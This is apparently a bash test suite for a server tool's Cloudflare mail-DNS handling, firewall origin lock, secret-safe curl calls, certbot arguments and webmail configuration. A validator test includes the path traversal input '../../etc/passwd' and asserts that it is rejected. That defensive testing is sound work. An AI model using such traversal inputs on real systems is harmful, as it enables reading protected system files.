    "GET /zones?name=alpha.example"*)      printf "%s" "$_cf_zone_json" ;;
    "GET /zones?name="*)                   printf "%s" "{\"success\":true,\"result\":[]}" ;;
    "GET /zones/zone123/dns_records?type=A&name=mail.alpha.example"*) printf "%s" "$_cf_a_json" ;;
    "GET /zones/zone123/dns_records?type=MX"*)  printf "%s" "$_cf_mx_json" ;;
    "GET /zones/zone123/dns_records?type=TXT&name=alpha.example"*) printf "%s" "$_cf_spf_json" ;;
    "GET /zones/zone123/dns_records?type=TXT"*) printf "%s" "{\"success\":true,\"result\":[]}" ;;
    "POST "*|"PUT "*|"DELETE "*)           printf "%s" "{\"success\":true,\"result\":{\"id\":\"rec1\"}}" ;;
    *) printf "%s" "{\"success\":true,\"result\":[]}" ;;
  esac
}'
_cf_a_json='{"success":true,"result":[]}'
_cf_mx_json='{"success":true,"result":[]}'
_cf_spf_json='{"success":true,"result":[]}'

# the zone of a name is found by walking up its labels
assert_eq "the zone of a mail name" "zone123" "$(lib_cf_zone_id mail.alpha.example)"
assert_has "which is asked for by name" "GET /zones?name=mail.alpha.example" "$(cat "$CF_CALLS")"
assert_has "and then for the domain above it" "GET /zones?name=alpha.example" "$(cat "$CF_CALLS")"
CF_ZONE_CACHE=()
assert_eq "a name in no zone this token can see is refused" 1 "$(run_isolated lib_cf_zone_id mail.nowhere.example)"

# A record: created when missing, left alone when already right, refused when it points
# somewhere else and lompstack did not write it
: >"$CF_CALLS"
MAIL_DNS_APPLIED=0; MAIL_DNS_CONFLICTS=0
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null
assert_has "a missing record is created" "POST /zones/zone123/dns_records" "$(cat "$CF_CALLS")"
assert_eq  "and counted"  1 "$MAIL_DNS_APPLIED"
_cf_a_json='{"success":true,"result":[{"id":"r1","content":"203.0.113.9","proxied":false,"comment":"lompstack:mail"}]}'
: >"$CF_CALLS"; MAIL_DNS_APPLIED=0
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null
assert_lacks "a record that already says it is left alone" "POST" "$(cat "$CF_CALLS")"
assert_eq    "and nothing is counted as written" 0 "$MAIL_DNS_APPLIED"
_cf_a_json='{"success":true,"result":[{"id":"r1","content":"198.51.100.7","proxied":true,"comment":""}]}'
MAIL_DNS_CONFLICTS=0
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null || true
assert_eq "somebody else's record is never overwritten" 1 "$MAIL_DNS_CONFLICTS"

# MX: another provider's mail server is a decision, not a leftover
_cf_mx_json='{"success":true,"result":[{"id":"m1","content":"aspmx.l.google.com","priority":1,"comment":""}]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 MX alpha.example "10 mail.alpha.example." >/dev/null || true
assert_eq    "a foreign MX stops the write" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "and nothing is deleted"       "DELETE" "$(cat "$CF_CALLS")"
: >"$CF_CALLS"; MAIL_DNS_CONFLICTS=0
_mail_dns_apply_one zone123 MX alpha.example "10 mail.alpha.example." --replace-mx >/dev/null
assert_has "--replace-mx takes it over"     "DELETE /zones/zone123/dns_records/m1" "$(cat "$CF_CALLS")"
assert_has "and writes ours"                "POST /zones/zone123/dns_records" "$(cat "$CF_CALLS")"

# a foreign MX next to ours still takes the domain's mail: the lowest preference wins
_cf_mx_json='{"success":true,"result":[{"id":"m1","content":"aspmx.l.google.com","priority":1,"comment":""},{"id":"m2","content":"mail.alpha.example","priority":10,"comment":"lompstack:mail"}]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 MX alpha.example "10 mail.alpha.example." >/dev/null || true
assert_eq "a foreign MX counts even when ours is there too" 1 "$MAIL_DNS_CONFLICTS"
# and taking it over writes ours BEFORE deleting theirs: the other way round, a refused
# write would leave the domain with no MX at all
: >"$CF_CALLS"; MAIL_DNS_CONFLICTS=0
_mail_dns_apply_one zone123 MX alpha.example "20 mail.alpha.example." --replace-mx >/dev/null
assert_eq "the write comes before the delete" "PUT
DELETE" "$(awk '/^(PUT|POST|DELETE)/{print $1}' "$CF_CALLS")"
_cf_mx_json='{"success":true,"result":[]}'

# two SPF records are the same as none, so an existing one is never overwritten
_cf_spf_json='{"success":true,"result":[{"id":"s1","content":"v=spf1 include:_spf.google.com ~all","comment":""}]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 TXT alpha.example "v=spf1 ip4:203.0.113.9 ~all" >/dev/null || true
assert_eq    "an existing SPF record is reported, not replaced" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "and nothing is written"       "POST" "$(cat "$CF_CALLS")"
_cf_spf_json='{"success":true,"result":[]}'

# DMARC and DKIM live at a name of their own, so anything already there was put there by
# somebody. A second record does not override it - two DMARC records mean no policy at all.
_cf_dmarc_json='{"success":true,"result":[{"id":"d1","content":"v=DMARC1; p=quarantine; rua=mailto:me@alpha.example","comment":""}]}'
eval '_cf_api() {
  printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"
  case "$1 $2" in
    "GET /zones/zone123/dns_records?type=TXT&name=_dmarc"*) printf "%s" "$_cf_dmarc_json" ;;
    "GET /zones/zone123/dns_records?type=TXT&name=sel._domainkey"*) printf "%s" "$_cf_dkim_json" ;;
    "GET "*)  printf "%s" "{\"success\":true,\"result\":[]}" ;;
    *)        printf "%s" "{\"success\":true,\"result\":{\"id\":\"rec1\"}}" ;;
  esac
}'
_cf_dkim_json='{"success":true,"result":[]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 TXT _dmarc.alpha.example "v=DMARC1; p=none; rua=mailto:x@alpha.example" >/dev/null || true
assert_eq    "a DMARC record somebody wrote is not doubled" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "and nothing is written"                       "POST" "$(cat "$CF_CALLS")"

# Cloudflare gives a TXT value over 255 bytes back as several strings. Comparing that with
# what we mean to write would rewrite the DKIM key on every single run.
assert_eq "a chunked TXT value reads as one string" "v=DKIM1; k=rsa; p=AAAABBBB" "$(_mail_txt_norm '"v=DKIM1; k=rsa; p=AAAA" "BBBB"')"
_cf_dkim_json='{"success":true,"result":[{"id":"k1","content":"\"v=DKIM1; k=rsa; p=AAAA\" \"BBBB\"","comment":"lompstack:mail"}]}'
MAIL_DNS_APPLIED=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 TXT sel._domainkey.alpha.example "v=DKIM1; k=rsa; p=AAAABBBB" >/dev/null
assert_eq    "so the DKIM record is written once, not on every run" 0 "$MAIL_DNS_APPLIED"
assert_lacks "and no second call is made"   "PUT" "$(cat "$CF_CALLS")"

# a failed API call is not an empty zone: answering "there is nothing here" is what makes a
# caller add a second SPF or a second MX record
eval '_cf_api() { printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"; printf "%s" "{\"success\":false,\"errors\":[{\"message\":\"rate limited\"}]}"; }'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
assert_eq    "a refused read fails"  1 "$(run_isolated lib_cf_records zone123 TXT alpha.example)"
_mail_dns_apply_one zone123 TXT alpha.example "v=spf1 ip4:203.0.113.9 ~all" >/dev/null || true
assert_eq    "and nothing is written on top of it" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "no record is created blind"          "POST" "$(cat "$CF_CALLS")"

# a second A record at the same name sends half of every mail connection to the wrong host
eval '_cf_api() {
  printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"
  case "$1 $2" in
    "GET /zones?name=alpha.example"*)         printf "%s" "$_cf_zone_json" ;;
    "GET /zones/zone123/dns_records?type=A"*) printf "%s" "$_cf_a_json" ;;
    "GET "*) printf "%s" "{\"success\":true,\"result\":[]}" ;;
    *)       printf "%s" "{\"success\":true,\"result\":{\"id\":\"rec1\"}}" ;;
  esac
}'
_cf_a_json='{"success":true,"result":[{"id":"r1","content":"203.0.113.9","proxied":false,"comment":"lompstack:mail"},{"id":"r2","content":"198.51.100.7","proxied":false,"comment":""}]}'
MAIL_DNS_CONFLICTS=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null || true
assert_eq    "a second A record is a conflict, whoever wrote the first" 1 "$MAIL_DNS_CONFLICTS"
assert_lacks "and nothing is overwritten" "PUT" "$(cat "$CF_CALLS")"
# one the operator made by hand that already says the right thing is simply left alone
_cf_a_json='{"success":true,"result":[{"id":"r2","content":"203.0.113.9","proxied":false,"comment":""}]}'
MAIL_DNS_CONFLICTS=0; MAIL_DNS_APPLIED=0; : >"$CF_CALLS"
_mail_dns_apply_one zone123 A mail.alpha.example 203.0.113.9 >/dev/null
assert_eq "a hand-made record that is already right is accepted" 0 "$((MAIL_DNS_CONFLICTS + MAIL_DNS_APPLIED))"
_cf_a_json='{"success":true,"result":[]}'

# a value the table could not fill in is a placeholder for the reader, never a live record
_dns_records_real="$(declare -f _mail_dns_records)"
eval '_mail_dns_records() { printf "A\tmail.%s\t<the IPv4 address of this server>\tnote\n" "$1"; }'
: >"$CF_CALLS"; MAIL_DNS_SKIPPED=0
printf 'dns_cloudflare_api_token = Xv8sQ2pLm9TzR4kWn1bYc7dEf0g\n' >"$CF_INI"
CF_ZONE_CACHE=()
lib_mail_dns_apply alpha.example >/dev/null 2>&1 || true
assert_eq    "a placeholder is skipped" 1 "$MAIL_DNS_SKIPPED"
assert_lacks "and never published"      "POST" "$(cat "$CF_CALLS")"
eval "$_dns_records_real"

# a dry run sends nothing at all
: >"$CF_CALLS"
printf 'dns_cloudflare_api_token = Xv8sQ2pLm9TzR4kWn1bYc7dEf0g\n' >"$CF_INI"
OPT_DRY_RUN=1
lib_mail_dns_apply alpha.example >/dev/null 2>&1 || true
OPT_DRY_RUN=0
assert_eq "a dry run sends no request" "" "$(cat "$CF_CALLS")"

# cleanup removes what lompstack wrote and nothing else
eval '_cf_api() {
  printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"
  case "$1 $2" in
    "GET /zones?name=alpha.example"*) printf "%s" "{\"success\":true,\"result\":[{\"id\":\"zone123\"}]}" ;;
    "GET /zones/"*)  printf "%s" "{\"success\":true,\"result\":[{\"id\":\"mine\",\"comment\":\"lompstack:mail\"},{\"id\":\"theirs\",\"comment\":\"\"}]}" ;;
    *) printf "%s" "{\"success\":true,\"result\":{\"id\":\"mine\"}}" ;;
  esac
}'
CF_ZONE_CACHE=(); : >"$CF_CALLS"
lib_mail_dns_cleanup alpha.example >/dev/null 2>&1
assert_has   "the records lompstack wrote are deleted" "DELETE /zones/zone123/dns_records/mine" "$(cat "$CF_CALLS")"
assert_lacks "a record somebody else added stays"      "dns_records/theirs" "$(cat "$CF_CALLS")"
eval "$_cf_api_real"                   # the real one again, for the sections below
CF_INI="$TMP/cloudflare-absent.ini"

# =============================================================================
section "the origin lock"
# 80 and 443 closed to everything but Cloudflare, and the two things that must follow from it
_ol="$(declare -f lib_cf_origin_lock)"
assert_has "the lock needs a token first"       "lib_cf_token" "$_ol"
assert_has "because HTTP-01 stops working"      "DNS-01" "$_ol"
assert_has "it asks before closing the ports"   "lib_confirm" "$_ol"
assert_has "the open rules go, by number"       "_cf_ufw_web_rule_numbers" "$_ol"
assert_has "and the lock checks nothing was left open" "still open port 80 or 443" "$_ol"
assert_has "a lock schedules the refresh it promises"  "lib_cf_schedule" "$_ol"
assert_has "and every rule carries lompstack's name" 'comment "$CF_UFW_COMMENT"' "$_ol"
assert_has "certbot switches to DNS-01 while it is on" "lib_cf_origin_locked" "$(declare -f lib_ssl_obtain)"
assert_has "but only with a token to switch to"        "lib_cf_origin_locked && lib_ssl_cf_token_available" "$(declare -f lib_ssl_obtain)"
assert_has "and the weekly range refresh renews the rules" "lib_cf_origin_relock" "$(declare -f lib_cf_update_ips)"
# renewing must never unlock first: that would open the origin to everyone for the length
# of the rebuild, and an abort in between would leave it that way
assert_lacks "which never opens the ports in between" "lib_cf_origin_unlock" "$(declare -f lib_cf_update_ips)"
assert_has   "the lock's own refresh cannot re-lock behind the question" "CF_LOCK_RENEWING" "$_ol"
# a re-run of install would otherwise put "Anywhere" back next to the Cloudflare rules
assert_has "installing again leaves a locked origin locked" "lib_cf_origin_locked" "$(declare -f lib_install_ufw)"
# Which rules the lock takes away, decided on the real shape of "ufw status numbered". A rule
# may name both ports at once - 80,443/tcp is what ufw writes for a rule made that way - and
# the per-port deletion this replaced never matched one, so a hand-made combined rule survived
# the lock and left the ports open to the whole internet while lomp reported them closed. The
# lock's own rules have that very shape, so they are told apart by their comment.
_ufw_num_out='Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 80,443/tcp                 ALLOW IN    Anywhere                   # combined, made by hand
[ 3] 443/udp                    ALLOW IN    Anywhere
[ 4] 80/tcp                     ALLOW IN    Anywhere
[ 5] 8080/tcp                   ALLOW IN    Anywhere
[ 6] 80,443/tcp                 ALLOW IN    173.245.48.0/20            # lompstack cloudflare origin
[ 7] 443/udp                    ALLOW IN    173.245.48.0/20            # lompstack cloudflare origin
[ 8] 79:81/tcp                  ALLOW IN    203.0.113.4
[ 9] 25/tcp                     ALLOW IN    Anywhere                   # lompstack mail'
eval 'ufw() { printf "%s" "$_ufw_num_out"; }'
_webnums="$(_cf_ufw_web_rule_numbers | tr '\n' ' ')"
assert_eq  "the combined, the plain and the range rules go, highest number first" "8 4 3 2 " "$_webnums"
assert_lacks "the lock's own rules stay"        " 6 " " $_webnums"
assert_lacks "and so does 8080, which is not 80" " 5 " " $_webnums"
assert_lacks "SSH is never touched"             " 1 " " $_webnums"
assert_lacks "nor the mail ports"               " 9 " " $_webnums"
unset -f ufw
_ou="$(declare -f lib_cf_origin_unlock)"
assert_has "unlocking puts the open rules back" "lib_ufw_rule allow 80/tcp" "$_ou"

# the rules are matched back to the ranges they name, so a renewal can remove only the stale
# ones instead of deleting them all and hoping the rebuild works
eval 'ufw() { case "$*" in *numbered*) printf "%s" "$_ufw_out" ;; *) printf "%s" "$_ufw_plain" ;; esac; }'
_ufw_out='Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 80,443/tcp                 ALLOW IN    173.245.48.0/20            # lompstack cloudflare origin
[ 3] 443/udp                    ALLOW IN    173.245.48.0/20            # lompstack cloudflare origin
[ 4] 80/tcp                     ALLOW IN    198.51.100.10              # office staging
[10] 80,443/tcp                 ALLOW IN    2400:cb00::/32             # lompstack cloudflare origin
'
assert_eq "the lock rules are read highest number first" "10 2400:cb00::/32
3 173.245.48.0/20
2 173.245.48.0/20" "$(_cf_ufw_lock_rule_ranges)"
_ufw_plain='Status: active

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
80,443/tcp                 ALLOW       173.245.48.0/20            # lompstack cloudflare origin
80/tcp                     ALLOW       198.51.100.10              # office staging
443/tcp (v6)               ALLOW       Anywhere (v6)
'
assert_eq "and a rule of the operator's on 80 is seen before it is deleted" \
  "80/tcp                     ALLOW       198.51.100.10              # office staging" "$(_cf_ufw_foreign_web_rules)"
unset -f ufw
# grep -c prints 0 AND fails when it counts nothing, so a fallback would print it twice
printf '# only a comment\n' >"$TMP/cf-ips-empty.conf"
assert_eq "an empty range list counts as one 0" "0" "$(CF_IPS_FILE="$TMP/cf-ips-empty.conf" _cf_ips_count)"
assert_eq "and a missing file too"              "0" "$(CF_IPS_FILE="$TMP/cf-ips-none.conf" _cf_ips_count)"

# =============================================================================
section "a secret never reaches a command line"
# /proc/<pid>/cmdline is world-readable, so every site user of this server can read the
# arguments of any command while it runs. Tokens therefore go to curl in a configuration on
# standard input, and these tests assert on what curl actually received.
_curl_argv="$TMP/curl.argv"; _curl_stdin="$TMP/curl.stdin"
: >"$_curl_argv"; : >"$_curl_stdin"
eval 'curl() { printf "%s\n" "$*" >>"$_curl_argv"; cat >"$_curl_stdin"; printf "%s" "${CURL_REPLY:-}"; }'
_cf_tok="Xv8sQ2pLm9TzR4kWn1bYc7dEf0g"
CURL_REPLY='{"result":{"status":"active"}}' CF_API_TOKEN_OVERRIDE="$_cf_tok" _cf_api GET /user/tokens/verify >/dev/null
assert_lacks "the Cloudflare token stays out of curl's arguments" "$_cf_tok" "$(cat "$_curl_argv")"
assert_has   "curl reads it from the configuration on stdin"      "$_cf_tok" "$(cat "$_curl_stdin")"
assert_has   "which carries the method" 'request = "GET"'                        "$(cat "$_curl_stdin")"
assert_has   "and the full URL"         "url = \"${CF_API}/user/tokens/verify\"" "$(cat "$_curl_stdin")"
assert_eq    "no token means no request" 1 "$(CF_API_TOKEN_OVERRIDE= CF_INI="$TMP/no-such.ini" run_isolated _cf_api GET /accounts)"

: >"$_curl_argv"; : >"$_curl_stdin"
_tg_tok="123456:ABCdefGhiJklMnoPqr"
NOTIFY_CONF="$TMP/notify.conf"
printf 'TELEGRAM_TOKEN=%s\nTELEGRAM_CHAT=-1001234567\n' "$_tg_tok" >"$NOTIFY_CONF"
lib_notify_send "disk almost full" "body" >/dev/null 2>&1 || true
assert_lacks "the Telegram token stays out of curl's arguments" "$_tg_tok" "$(cat "$_curl_argv")"
assert_has   "the URL holding it comes in on stdin" "api.telegram.org/bot${_tg_tok}/sendMessage" "$(cat "$_curl_stdin")"
assert_has   "while the chat id may stay an argument" "chat_id=-1001234567" "$(cat "$_curl_argv")"
unset -f curl

CF_INI="$TMP/cf-live.ini"; CF_F2B_ACTION="$TMP/cf-action-live.conf"; CF_F2B_AUTH="$TMP/cf-auth-live.header"
printf 'dns_cloudflare_api_token = %s\n' "$_cf_tok" >"$CF_INI"
lib_manifest_set '.cloudflare.account_id' 'acc0123456789'
lib_cf_fail2ban_action_write
_act="$(cat "$CF_F2B_ACTION")"
assert_lacks "a ban carries no token on its command line" "$_cf_tok" "$_act"
assert_has   "curl takes the header from a file"          '-H @<cfauth>' "$_act"
assert_has   "the file the action names is the one lomp wrote" "cfauth = ${CF_F2B_AUTH}" "$_act"
assert_eq    "which holds the header"  "Authorization: Bearer ${_cf_tok}" "$(cat "$CF_F2B_AUTH")"
if (( CAN_CHMOD )); then assert_eq "and only root may read it" "600" "$(stat -c %a "$CF_F2B_AUTH")"; fi
assert_lacks "the jail lines carry no token either" "$_cf_tok" "$(lib_cf_fail2ban_action_lines)"

_sec="$TMP/secret-write.conf"
_q="$OPT_QUIET"; OPT_QUIET=0; OPT_DRY_RUN=1
_out="$(printf 'dns_cloudflare_api_token = %s\n' "$_cf_tok" | lib_write_file "$_sec" 0600 "" secret 2>&1)"
_out2="$(printf 'ServerName x\n' | lib_write_file "$TMP/plain-write.conf" 0644 2>&1)"
OPT_DRY_RUN=0; OPT_QUIET="$_q"
assert_lacks "a dry run never prints a secret's contents" "$_cf_tok" "$_out"
assert_has   "it says how much it would write instead" "contents not shown" "$_out"
assert_has   "an ordinary file is still shown in full" "would create" "$_out2"
assert_false "and the dry run wrote nothing" test -e "$_sec"
printf 'dns_cloudflare_api_token = %s\n' "$_cf_tok" | lib_write_file "$_sec" 0600 "" secret
if (( CAN_CHMOD )); then assert_eq "the file itself is written 0600" "600" "$(stat -c %a "$_sec")"; fi

# =============================================================================
section "certificates for names that belong to no site"
_cert_args() {   # cert-name name...   -> the certbot command line it would run
  eval 'lib_run() { printf "%s\n" "$*"; }
        lib_pkg_installed() { [[ "$1" == "python3-certbot-dns-cloudflare" ]]; }'
  OPT_DRY_RUN=1
  lib_ssl_obtain_names "$@" 2>/dev/null
}
CF_INI="$TMP/cf-absent-for-certs.ini"; rm -f "$CF_INI"
_cb="$(_cert_args _mailhost mail.example.com)"
assert_has "one lineage for the mail host"    "--cert-name _mailhost" "$_cb"
assert_has "carrying the name asked for"      "-d mail.example.com" "$_cb"
assert_has "webroot while no token is stored" "--webroot" "$_cb"
CF_INI="$TMP/cf-present-for-certs.ini"; printf 'dns_cloudflare_api_token = %s\n' "$_cf_tok" >"$CF_INI"
_cb="$(_cert_args _mail_example_com mail.example.com webmail.example.com)"
assert_has "DNS-01 once a token is stored"  "--dns-cloudflare" "$_cb"
assert_has "both names on one certificate"  "-d mail.example.com -d webmail.example.com" "$_cb"
assert_lacks "and the token is not an argument" "$_cf_tok" "$_cb"
assert_eq "a certificate with no names is refused" 1 "$(run_isolated lib_ssl_obtain_names _mailhost)"

# A jq filter with a comma is a generator: it prints the whole object once per change, and
# the state file then holds two documents that every later read answers twice.
_js="$TMP/json-set.json"; printf '{"a":1}\n' >"$_js"
assert_eq  "a filter with a comma is refused" 1 "$(run_isolated lib_json_set "$_js" '.b = 2, .c = 3')"
assert_eq  "and the file is left as it was"  '{"a":1}' "$(tr -d ' \n' <"$_js")"
lib_json_set "$_js" '.b = 2 | .c = 3'
assert_eq  "the same thing with a pipe works" '{"a":1,"b":2,"c":3}' "$(jq -c . "$_js")"

# What a lineage covers is read from the certificate, not from certbot's renewal file: the
# file says what was asked for, the certificate says what was issued. A lineage that is
# missing a name has to be re-issued with the whole set, so the test must be exact.
if lib_have openssl; then
  LE_LIVE="$TMP/le"; mkdir -p "$LE_LIVE/_mail_x"
  # MSYS2_ARG_CONV_EXCL: under Git Bash an argument starting with "/" is rewritten into a
  # Windows path, and "/CN=..." would reach openssl as "C:/Program Files/Git/CN=...".
  # The variable means nothing on Linux.
  MSYS2_ARG_CONV_EXCL='/CN=' openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
    -keyout "$LE_LIVE/_mail_x/privkey.pem" -out "$LE_LIVE/_mail_x/cert.pem" \
    -subj "/CN=mail.x.test" -addext "subjectAltName=DNS:mail.x.test,DNS:webmail.x.test" >/dev/null 2>&1
  assert_eq   "both names are read off the certificate" "mail.x.test
webmail.x.test" "$(lib_ssl_cert_names _mail_x)"
  assert_true  "and it covers them"            lib_ssl_cert_covers _mail_x mail.x.test webmail.x.test
  assert_true  "whatever the case"             lib_ssl_cert_covers _mail_x MAIL.X.TEST
  assert_false "a name that is not on it"      lib_ssl_cert_covers _mail_x mail.x.test other.x.test
  assert_false "and a lineage that is not there" lib_ssl_cert_covers _absent mail.x.test
fi

lib_ssl_hook_render >"$TMP/hook-mail.sh"
assert_true "the deploy hook still parses" bash -n "$TMP/hook-mail.sh"
_hk="$(cat "$TMP/hook-mail.sh")"
assert_has "it has its own branch for the mail lineages" "_mailhost|_mail_*)" "$_hk"
assert_has "which reloads Postfix"                       "postfix reload" "$_hk"
assert_has "and Dovecot"                                 "systemctl reload dovecot" "$_hk"
# lsws' own graceful restart replaces the process behind systemd's back; the next restart fails
assert_has   "a site's certificate restarts OpenLiteSpeed" 'systemctl restart "$OLS_SERVICE"' "$_hk"
assert_lacks "and nothing reloads lsws through systemd"    "systemctl reload lsws" "$_hk"

# =============================================================================
section "mail names, and the RAM the mail stack takes"
assert_true  "a plain local part"       lib_mail_local_valid "info"
assert_true  "dots, dashes and digits"  lib_mail_local_valid "first.last-1"
assert_false "no leading dot"           lib_mail_local_valid ".info"
assert_false "no double dot"            lib_mail_local_valid "a..b"
assert_false "no slash"                 lib_mail_local_valid "a/b"
assert_false "no path traversal"        lib_mail_local_valid "../../etc/passwd"
assert_false "not empty"                lib_mail_local_valid ""
assert_true  "a full address, any case" lib_mail_address_valid "Info@Example.COM"
assert_false "one @ and no more"        lib_mail_address_valid "a@b@example.com"
assert_false "a domain is required"     lib_mail_address_valid "info@"
assert_true  "a quota with a unit"      lib_mail_quota_valid "1G"
assert_true  "0 means no limit"         lib_mail_quota_valid "0"
assert_false "nothing free-form"        lib_mail_quota_valid "1TB"
# the leading underscore is what keeps a mail lineage out of reach of any site
assert_eq    "the mail lineage of a site"     "_mail_example_com" "$(lib_mail_cert_name example.com)"
assert_false "no site can be called that" lib_domain_valid "_mail_example_com"

SYS_ANALYZED=1; SYS_RAM_MB=4096; SYS_RAM_AVAIL_MB=3000; SYS_CPU_CORES=2; SYS_DISK_TYPE=ssd; SYS_SWAP_MB=0
DB_BUFFER_PERCENT=""; REDIS_MAX_PERCENT=""
lib_system_profile
assert_eq "nothing is reserved while mail is not installed" 0 "$CALC_MAIL_MB"
_php_no_mail="$CALC_PHP_CHILDREN_TOTAL"
lib_manifest_set '.components.mail.postfix' '3.8.6'
lib_system_profile
assert_eq "512 MB at 4 GB once the stack is there" 512 "$CALC_MAIL_MB"
assert_true "which leaves fewer PHP workers" bash -c "(( $CALC_PHP_CHILDREN_TOTAL < $_php_no_mail ))"
lib_json_set "$STATE_DIR/manifest.json" 'del(.components.mail)'
lib_system_profile
assert_eq "and the reservation goes with the stack" 0 "$CALC_MAIL_MB"

# =============================================================================
section "the webmail"
# Everything here is a pure renderer or a pure name, so the whole of it runs without root and
# without Roundcube on the machine.
assert_eq "one webmail name per domain"  "webmail.alpha.example" "$(lib_webmail_host alpha.example)"
assert_eq "and a vhost name no site can claim" "_wm_alpha_example" "$(lib_webmail_vhost_name alpha.example)"
# the pinned key: a fingerprint is 40 hex characters, and a wrong one must not be a typo
assert_true "the signing key is pinned in full" bash -c "[[ \"$WM_KEY_FPR\" =~ ^[0-9A-F]{40}$ ]]"

# PHP: Roundcube 1.7 runs on 8.1 up to but not including 8.6, and nothing else is offered
eval 'lib_php_default_version() { printf "8.3"; }
      lib_php_installed_versions() { printf "%s\n" 8.1 8.3; }'
assert_eq "the server default when it is in range" "8.3" "$(lib_webmail_php_version)"
eval 'lib_php_default_version() { printf "8.6"; }'
assert_eq "otherwise the newest that is"           "8.3" "$(lib_webmail_php_version)"
eval 'lib_php_installed_versions() { printf "%s\n" 8.0 8.6; }'
assert_eq "and nothing at all when none fits"      1     "$(run_isolated lib_webmail_php_version)"
eval 'lib_php_default_version() { printf "8.3"; }
      lib_php_installed_versions() { printf "%s\n" 8.3; }'

# the configuration is rendered whole from state, and never written empty: a failure on the
# left of a pipe would otherwise put an empty file where the credentials belong
WM_INFO="$TMP/webmail.info"; WM_CONF="$TMP/webmail-config.inc.php"; rm -f "$WM_INFO" "$WM_CONF"
assert_eq "no state, no configuration" 1 "$(run_isolated lib_webmail_render_config)"
lib_webmail_config_apply
assert_true "and nothing is written"   bash -c "[[ ! -e '$WM_CONF' ]]"
printf 'WM_DB_NAME=lomp_webmail
WM_DB_USER=lomp_webmail
WM_DB_PASS=S3cretDbPass0123456789012345
WM_DES_KEY=0123456789abcdef0123456789abcdef
' >"$WM_INFO"
CF_IPS_FILE="$TMP/cf-ips-wm.conf"
printf '# ranges
173.245.48.0/20
2400:cb00::/32
' >"$CF_IPS_FILE"
lib_json_set "$(lib_domain_json alpha.example)" '.mail.enabled = true | .mail.webmail = true'
eval 'lib_domains_list() { printf "%s\n" alpha.example; }'
_wm="$(lib_webmail_render_config)"
assert_has "IMAP goes to Dovecot over TLS on the loopback" "imap_host'] = 'ssl://127.0.0.1:993'" "$_wm"
assert_has "because Dovecot requires it even there"        "verify_peer' => false"                "$_wm"
assert_has "submission is the webmail's own port"          "smtp_host'] = '127.0.0.1:10587'"      "$_wm"
assert_has "sieve is Dovecot's"                            "managesieve_host'] = '127.0.0.1:4190'" "$_wm"
assert_has "the installer stays off"                       "enable_installer'] = false"           "$_wm"
assert_has "the log goes to the journal"                   "log_driver'] = 'syslog'"              "$_wm"
assert_has "failed logins are logged, for fail2ban"        "log_logins'] = true"                  "$_wm"
assert_has "TLS ends at the proxy"                         "use_https'] = true"                   "$_wm"
# an unescaped dot in the host pattern would also match "webmailXalphaYexample"
assert_has "every dot of a trusted host is escaped" "'^webmail\.alpha\.example\$'" "$_wm"
assert_has "Cloudflare's ranges are the only trusted proxies" "'173.245.48.0/20'" "$_wm"
assert_has "IPv6 included"                                    "'2400:cb00::/32'"  "$_wm"
# a domain whose webmail is off is not in the list of hosts it will answer for
lib_json_set "$(lib_domain_json alpha.example)" 'del(.mail.webmail)'
assert_lacks "a domain without webmail is not trusted" "webmail\.alpha" "$(lib_webmail_render_config)"
lib_json_set "$(lib_domain_json alpha.example)" '.mail.webmail = true'

# the PHP the webmail runs on: the limit is address space, and OPcache maps 512 MB before the
# first line of code. A smaller limit does not make it smaller, it makes every request a 503.
_wmx="$(lib_webmail_render_extprocessor)"
assert_has "the webmail has its own PHP user"  "extUser                 lompwebmail" "$_wmx"
assert_has "a bounded number of children"      "PHP_LSAPI_CHILDREN=4"                "$_wmx"
assert_has "and room for the OPcache segment"  "memSoftLimit            2047M"       "$_wmx"

_wmv="$(lib_webmail_render_vhconf alpha.example)"
assert_has "the docroot goes through 'current'" 'docRoot                   $VH_ROOT/current/public_html/' "$_wmv"
assert_has "it answers for the webmail name"    "vhDomain                  webmail.alpha.example"         "$_wmv"
assert_has "the shared PHP handles it"          "add                     lsapi:lsphp_webmail php"        "$_wmv"
# Roundcube ships .htaccess files for Apache; reading them under OpenLiteSpeed costs a stat
# per request and grants nothing
assert_has "no .htaccess is read"               "autoLoadHtaccess        0"  "$_wmv"
assert_has "ACME can still answer on port 80"   "context /.well-known/acme-challenge/" "$_wmv"

# fail2ban reads every file in filter.d at start and refuses to start at all when one of them
# is wrong - taking the SSH jail down with it. %(__prefix_line)s comes from common.conf.
_wmf="$(lib_webmail_render_filter)"
assert_has "the filter includes what its pattern needs" "before = common.conf" "$_wmf"
assert_has "and matches what Roundcube writes"          "Failed login" "$_wmf"
assert_true "the jail is banned on, not just written"   bash -c "[[ '$(lib_webmail_render_jail)' == *'enabled = true'* ]]"
assert_has "and it reads the journal"                   "backend = systemd" "$(lib_webmail_render_jail)"

# gpgv accepts a signature from ANY key in the keyring it is given, so the pin has to be
# compared against every primary key in the file - not the first one
_kr="$(declare -f _wm_keyring_fpr)"
assert_has  "every primary key is read, not the first" "/^pub:/{p=1; next}" "$_kr"
